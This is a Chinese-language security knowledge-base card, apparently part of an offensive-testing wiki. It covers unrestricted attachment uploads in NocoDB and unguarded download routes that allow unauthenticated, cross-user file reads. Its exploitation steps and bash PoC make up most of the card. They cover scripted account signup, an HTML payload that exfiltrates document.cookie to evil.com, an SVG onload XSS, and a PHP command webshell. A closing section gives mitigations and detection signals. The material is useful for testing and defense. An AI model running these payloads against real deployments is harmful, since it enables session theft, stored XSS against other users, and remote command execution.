---
id: web-generic-file-upload-nocodb-attachment-unauth-download-idor
title: NocoDB 附件上传不限 MIME + 三个下载路由零守卫：任意类型文件公开可读与跨用户 IDOR
type: scenario
domain: web
path: web/generic/file-upload
technique: nocodb-attachment-any-mime-unauth-download
tags:
- nocodb
- file-upload
- mime
- download
- idor
- unauth
- stored-xss
- nodejs
- nestjs
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: NocoDB 2026.07.0（Docker latest，原文测试版本）
verification:
  verified_by: verifier-V66
  verified_at: '2026-11-05T12:34:04+08:00'
  notes: 已对照原文与图05-11核对：AnyFilesInterceptor+UploadAllowedInterceptor 下 viewer Token 成功上传 HTML(text/html)、SVG(image/svg+xml)、PHP；响应含 path(download/YYYY/MM/DD/hash/filename) 与 signedPath(dltemp/...)；/download 与 /dltemp 无 Token 直接读回 HTML，/dl 路径不匹配 404 但同样无守卫；跨用户路径读取成立。注意原文正文称 PHP 被识别为 application/x-httpd-php，图07实际响应 mimetype 为 application/octet-stream，已在卡内检测项修正；PHP WebShell 依赖共享卷+PHP 解析的环境条件已标注。affected_versions 2026.07.0 为原文测试版本，保留；未在本机复现。
url: /docs/web/generic/file-upload/web-generic-file-upload-nocodb-attachment-unauth-download-idor/
draft: false
kb_aliases:
- NocoDB 任意文件上传
- NocoDB 下载未授权
- /download /dl /dltemp
- AnyFilesInterceptor
- UploadAllowedInterceptor
- NocoDB 附件 IDOR
- NocoDB 存储型 XSS
---

## 一句话结论

NocoDB 的附件上传使用 `AnyFilesInterceptor()`，不做 MIME/后缀/魔数校验，注册用户（实测 viewer 也可）能上传 HTML、SVG、PHP 等任意类型；同时 `/download/:filename(*)`、`/dl/:p1/:p2/:filename(*)`、`/dltemp/:param(*)` 三个下载路由均未挂守卫，知道路径即可无认证读取，且不校验文件归属，形成任意类型文件公开分发 + 跨用户 IDOR 的存储型 XSS/WebShell 链。

## 原理

- 上传路由 `@UseGuards(MetaApiLimiterGuard, GlobalGuard)` + `@UseInterceptors(UploadAllowedInterceptor, AnyFilesInterceptor())`：`AnyFilesInterceptor()` 是 NestJS multer 封装，接受所有 multipart 文件字段，不做 MIME、扩展名或魔数检查。
- `UploadAllowedInterceptor` 只检查 SUPER_ADMIN/CREATOR/EDITOR/项目 EDITOR 等角色，但实测 org-level-viewer 仍能上传；作者推测 `extractRolesObj` 解析或 `try/catch` 吞异常导致，机制未完全确认，但行为可复现。
- 上传响应返回 `path`（`download/YYYY/MM/DD/hash(userId)/filename`）与 `signedPath`（`dltemp/<signed_id>/<timestamp>/...`）；路径中含 `hash(userId)`，但下载路由不校验访问者身份。
- 三个下载路由在同一 controller 内均无 `@UseGuards`：`fileRead` 直接 `path.join('nc','uploads',filename)`；`fileReadv2` 拼 `nc/<p1>/<p2>/uploads/<filename>`；`fileReadv3` 走 `PresignedUrl.getPath('dltemp/...')`，名字带 signed 但只查库透传路径，无签名校验。
- 下载时 `isPreviewAllowed` 决定 `sendFile`（浏览器渲染）还是 `download`；HTML 不在预览白名单，但 `/download` 响应仍为 `text/html`，直接访问即渲染；SVG 上传成功且本地打开会执行 `onload`；PHP 仅在与 PHP-FPM 共享存储卷/反代解析时才能执行。
- 文件大小受 `NC_ATTACHMENT_FIELD_SIZE`（默认约 20MB）限制，50MB 会被 multer 丢弃并返回 “No attachment provided!”。

## 触发条件

- 目标暴露 NocoDB（默认 8080），开放注册或攻击者已有任意账号。
- 上传接口可达且 `UploadAllowedInterceptor` 未正确拦截低权用户（默认行为实测 viewer 可传）。
- 下载路由可公网/内网直接访问，攻击者知道或能获得文件路径（上传响应直接给出）。
- 存储型 XSS 需要受害者打开下载链接；PHP WebShell 需要目标存在共享卷 + PHP 解析环境（非默认）。

## 利用步骤

1. 注册拿 Token（见开放注册卡）。
2. 构造 HTML/SVG 文件，POST 到 `/api/v1/db/storage/upload`（或 `/api/v2/storage/upload`），`-F "file=@xss.html"`，从响应取 `path`/`signedPath`。
3. 不带任何 Token 访问 `http://target:8080/<path>` 或 `/<signedPath>`，确认内容原样返回且 `Content-Type: text/html`。
4. 将链接发给 NocoDB 用户；HTML 中 `fetch('/api/v1/auth/user/me',{credentials:'include'})` 可读取 `/api` 路径下的 `nc_token` Cookie 范围内的身份信息，或直接外带 `document.cookie`。
5. 换另一个账号 B，用 A 的文件路径直接访问，验证跨用户 IDOR（下载路由不校验归属）。
6. 若目标与 PHP 共享存储，上传 `<?php system($_GET['cmd']);?>` 并尝试通过反代 PHP 路径执行；否则以 HTML/SVG XSS 为主要危害。

## PoC

```bash
# 1. 注册拿 Token
TOKEN=$(curl -s -X POST http://target:8080/api/v1/auth/user/signup \
  -H "Content-Type: application/json" \
  -d '{"email":"uploader@test.com","password":"Hack1234!","first_name":"Up","last_name":"Loader"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

# 2. 上传 HTML（XSS）
echo '<script>fetch("https://evil.com/?c="+document.cookie)</script>' > xss.html
curl -s -X POST http://target:8080/api/v1/db/storage/upload \
  -H "xc-auth: $TOKEN" -F "file=@xss.html"
# [{"path":"download/2026/07/27/<hash>/xss.html","mimetype":"text/html",...,"signedPath":"dltemp/..."}]

# 3. 无认证下载（/download 与 /dltemp 均可）
curl -s http://target:8080/download/2026/07/27/<hash>/xss.html
curl -s http://target:8080/dltemp/<signed_id>/<ts>/2026/07/27/<hash>/xss.html

# 4. 上传 SVG（本地打开触发 onload）
echo '<?xml version="1.0"?><svg onload="alert(1)"/>' > xss.svg
curl -s -X POST http://target:8080/api/v1/db/storage/upload -H "xc-auth: $TOKEN" -F "file=@xss.svg"

# 5. 上传 PHP（仅在共享存储+PHP 解析环境可利用）
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -s -X POST http://target:8080/api/v1/db/storage/upload -H "xc-auth: $TOKEN" -F "file=@shell.php"
```

## 变体与关联

- **三个下载路由**：`/download` 直接路径、`/dl` 另一种路径格式（实际存储路径不匹配时 404，但同样无守卫）、`/dltemp` 看似 presigned 实则无签名校验；测试需覆盖全部。
- **跨用户 IDOR**：路径含 `hash(userId)` 但下载不校验归属；路径可由上传响应、日志、分享链接泄露。
- **SVG/HTML**：SVG 被移出预览白名单但上传不受限，用户下载后本地打开仍执行；HTML 直接以 `text/html` 返回，XSS 更直接。
- **PHP WebShell**：NocoDB 本身是 Node.js，不解析 PHP；仅当与 Nginx/Apache+PHP-FPM 共享存储卷时成立，属于条件利用。
- **关联**：[[web-generic-file-upload-html-static-stored-xss]]（任意后缀 HTML 存储型 XSS）、[[web-generic-file-upload-content-type-trust-bypass]]（MIME 信任绕过）、[[web-generic-auth-nocodb-open-signup-first-user-superadmin]]（注册入口）、[[web-generic-jwt-nocodb-store-secret-is-api-token-forgery]]（拿到管理员后的另一条链）。

## 检测与防御

- 上传加 MIME 白名单与扩展名/魔数校验，禁止 HTML、SVG、PHP、JSP 等可执行/可渲染类型；按业务只允许图片/文档。
- 给三个下载路由挂 `GlobalGuard`，并按 `req.user.id` 校验文件路径中的 `hash(userId)` 归属；启用真正的签名 URL（PresignedUrl）并校验签名与过期时间。
- 反向代理层拦截 `^/(download|dl|dltemp)/` 下的危险扩展名，NocoDB 不直接暴露公网。
- 检测：匿名访问 `/download`、`/dl`、`/dltemp` 的日志；上传 `text/html`、`image/svg+xml` 等可渲染类型，以及 `.php` 等可执行后缀（原文 PHP 上传响应 mimetype 实为 `application/octet-stream`，并非 `application/x-httpd-php`）；跨用户路径访问与短时间批量上传。
